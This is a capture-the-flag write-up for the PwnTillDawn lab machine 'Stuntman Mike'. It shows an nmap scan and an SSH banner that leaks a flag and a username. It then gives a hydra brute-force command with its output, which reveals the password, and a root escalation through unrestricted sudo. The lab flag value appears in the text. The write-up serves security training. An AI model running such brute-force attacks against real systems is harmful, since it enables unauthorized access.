---
layout: post
title: Stuntman Mike
category: [writeups,PwnTillDawn]
tags: [Linux,Privilege Escalation,SSH]
---

# Stuntman Mike
- Difficulty : `easy`
- IP Address : `10.150.150.166`
- Operating System : `Linux`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)
- [Flag](#flag)

## Nmap Result
```
Nmap scan report for 10.150.150.166
Host is up, received conn-refused (0.26s latency).
Scanned at 2022-07-20 06:29:26 UTC for 51s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 7.6p1 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:9e:99:ed:7e:e0:d5:83:ad:c9:ba:7c:f1:bc:44:06 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Io6lH1JUzMgOL61ifVuHVCiESD3iMdU9PtQrd2DLcgCZZURJVOIkYN+s08hP8BQ3S3qGpwcq5uubAEP/xCMSqPKJuBqWyOZy8cxNTM9f8hXJgbFngUIsR/Q+FujpwE83n+9mKQnv58AxH3745KoaM3Fjw5Qud1dtkSHoJdpeQI+YdAmmX97VdYrfY/ahOqB4YJ7Nb5FyN9sdZtbJF7koR715/oYlCc2UmpHOmABXJyRddNBIR3/26QLb8B+GokU6rNCEexDyHrOyv1XQo40EOGtsTwSn36eMfIUWVBFn0CZn5hfsiAIkAi5lLXHhCu4zrqHoDZ9ZuFlNCQ5ZDABz
|   256 7e:53:59:7b:2d:6c:3b:d7:21:28:cb:cb:78:af:99:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9PQMklhyPmgs+k+rtc0zU1RXBcZflYgNTvB20pztsry92hkOSMGCjStTdpK7+Ye5Tg+8O79vhUuCPgTbahuVs=
|   256 c5:d2:2d:04:f9:69:40:4c:15:34:36:fe:83:1f:f3:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILIxOJ4YwJhGMgu1zw+7j1EgBm4S7Xhy/67AsBojxJoC
8089/tcp open  ssl/http syn-ack Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-25T09:15:13
| Not valid after:  2022-10-24T09:15:13
| MD5:   a81b a4c7 ea97 ebc8 7f73 310f e279 3eb2
| SHA-1: 6bd8 1aeb bb06 78e8 33ff 3419 27c9 6b03 4d72 44c1
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQC3e+0+SZAJODANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTEwMjUwOTE1MTNaFw0yMjEwMjQwOTE1
| MTNaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyHuv
| prmwSsJM1ELosOTL9LZaQvGr4ot2OOkD4I5Qt4h6tWiR5pTo+uRihpw8lYHBj5K0
| y6ZhD2HX/vinR1ze8ldhSIxVTCuZeAWblpPQxbp48hKu1bYjypW4do4oSQvsNfjO
| u/qo28DHUClqqBjbhfHRzSoqG8ah7IrHTRmIWy3vGFZCdPW8PuH4Ekpe3uxxpFxn
| DFkfPEx4T7tt7mVNYNiGlKzW4zTRt4dfupRx/PVnzhaSWiiPDGGVb+RiMTyj1esC
| +w+7q7++rQT2FqFz5KXtkDeC5RE+fRMbcSW7AQyfWKC5FxY2354zkx5Ikx2ZehP4
| 65BYXltGoG9muQO1BQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCk9PEkp9ugd6xC
| DRlsg4UZbb4MpZ4jkbmxZvBsiKANt/L7sBV5oDdPLParf3QD8SSD083PykC4X0LH
| 0u930jIDxHGDdh70dEr8tTk1Cl4duKcpiZTu08lFpnZX+Sh/bm/mqnmv+m6FDZfF
| cjPjNx4TdUd4bfx8iUSNVmc6o8Eny9wtrBBLzQjF/XwkmRXWgugScWJ2WYqynMkA
| uM+s9vclLQO0JDi1VzKUGNbNAmiKiEqjmkKsgJ8lcbP3wVQe2nRVjZH4zVLaINVz
| wVEQRv74qu7IFAvq2VbjKD5g+zzrX3qBsprFsGPVAl/8MMEVzL2x61ME+DjZURhk
| sA9IE1tq
|_-----END CERTIFICATE-----
```

# Method to solve this challenge
In this challenge, we will be focusing on port 22 which is also ssh. Since we have no idea about both username and password, the only method is guessing for username with metasploit username enumeration or hope for data leak from ssh.
```
ssh 10.150.150.166        
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360
root@10.150.150.166's password:
```
When we connect the victim machine's ssh, it shows us it first flag as well as the username. Since stuntman mike contains spacebar, the username should either be stuntman or mike. Since we have the username, we could perform brute force attack with `hydra`.
```
hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://10.150.150.166 -I 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-20 02:34:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.150.150.166:22/
[22][ssh] host: 10.150.150.166   login: mike   password: babygirl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-20 02:35:02
```
We manage to get the password for user mike and there goes for our shell as well.
```
ssh 10.150.150.166 -l mike
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360
mike@10.150.150.166's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 20 07:20:48 UTC 2022

  System load:  0.09               Processes:            167
  Usage of /:   28.6% of 19.56GB   Users logged in:      1
  Memory usage: 21%                IP address for ens33: 10.150.150.166
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

18 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Wed Jul 20 07:06:05 2022 from 10.66.67.2
mike@stuntmanmike:~$ 
```

# Privilege Escalation
The shell we managed to get is user mike and we will need to perform privilege escalation in order to get root account. After looking for information, it seems that we are able to run anything as root with sudo command.
```
mike@stuntmanmike:~$ sudo -l
[sudo] password for mike: 
Matching Defaults entries for mike on stuntmanmike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on stuntmanmike:
    (ALL : ALL) ALL
mike@stuntmanmike:~$ sudo bash
root@stuntmanmike:~# id
uid=0(root) gid=0(root) groups=0(root)
```
We then managed to get our root account.
